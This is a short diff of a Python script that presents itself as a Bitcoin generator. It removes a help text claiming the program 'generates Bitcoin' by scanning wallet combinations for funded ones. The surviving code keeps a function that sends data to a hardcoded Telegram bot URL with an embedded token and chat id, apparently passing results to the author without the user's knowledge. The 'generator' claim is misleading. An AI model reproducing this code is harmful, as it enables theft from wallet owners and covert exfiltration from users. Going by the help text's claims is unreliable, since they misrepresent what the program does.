@@ -130,24 +130,6 @@ def tgsend(adds):
         "https://api.telegram.org/bot1895834648:AAFWbIT3T9PC5UyzBLVYCwIPmEO_gq15kO0/SendMessage?chat_id=218477456&text="+adds)
     return response
 
-def helpText():
-    print("""
-This program was made by Anarb and it generates Bitcoin by searching multiple possible
-wallet combinations until it's finds one with over 0 BTC and saves it into
-a file called "wet.txt" in the results folder.
-It's recommended to leave this running for a long time to get the best resaults, It's doesn't use up
-that much resources so you can leave it in the background in the chance of you hitting a jackpot.
-It's like mining but with less resources
-
-=========================================================================================
-
-start - Starts the program
-
-=========================================================================================
-
-More commands will be added soon plus other cryptocurrencies.
-        """)
-
 
 def start():
     try:
